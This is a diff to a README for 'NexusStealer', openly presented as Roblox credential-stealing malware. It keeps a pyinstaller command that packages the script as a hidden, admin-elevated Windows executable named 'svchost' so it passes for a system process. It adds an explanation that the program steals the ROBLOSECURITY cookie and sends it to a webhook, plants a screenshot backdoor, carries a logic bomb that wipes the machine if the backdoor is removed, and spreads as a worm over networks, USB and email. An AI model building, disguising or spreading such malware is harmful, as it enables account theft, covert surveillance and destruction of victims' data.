@@ -4,7 +4,7 @@
 
 ---
 
-## Explaination
+## Installation and customization
 
 Change the :
 ```
@@ -21,3 +21,12 @@ Convert to .exe :
 ```
 pyinstaller --onefile --noconsole --hidden-import psutil --hidden-import requests --hidden-import pywin32 --hidden-import pyautogui --hidden-import cryptography --hidden-import netifaces --hidden-import win32crypt --hidden-import win32gui --hidden-import win32con --hidden-import win32process --hidden-import win32security --hidden-import win32api --hidden-import win32file --uac-admin --name svchost NexusStealer.py
 ```
+
+---
+
+## Explanation
+
+When executed on a machine, the script will wait for a **Roblox Related** application to be oppened, will then search the whole computer data and browser data in search of the roblox login cookie (ROBLOSECURITY). Once found, it will send the cookie to the designed webhook, leave behind him a backdoor that will send a screenshot of the user desktop **every 30 Minutes** and another logic bomb that will continuisly check to see if the backdoor has been deleted, if yes, it will wipe the whole user computer from top to bottom. 
+
+***DO NOT RUN THIS SCRIPT ON YOUR OWN MACHINE OR ON SOMEONE ELSE MACHINE WITHOUT THEIR CONSENT***
+**Ive implemented a WORM in the script, meaning that it will spread through the network, usb and emails. Please be cautious of the uses of this script.**
